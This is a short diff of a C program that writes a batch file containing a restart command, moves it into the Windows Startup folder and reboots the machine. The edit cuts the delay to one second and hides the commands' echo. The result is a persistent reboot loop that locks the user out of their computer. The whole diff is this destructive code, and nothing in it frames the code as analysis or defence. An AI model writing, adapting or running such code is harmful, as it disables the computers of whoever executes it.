@@ -6,8 +6,8 @@ int main()
 {
     FILE *fp;
     fp = fopen("start.bat", "w+");
-    fprintf(fp, "shutdown -r -t 10\n");
+    fprintf(fp, "@shutdown -r -t 1\n");
     fclose(fp);
-    system("move start.bat \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup\"");
-    system("shutdown -r -t 10\n");
+    system("@move start.bat \"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup\"");
+    system("@shutdown -r -t 1\n");
 }
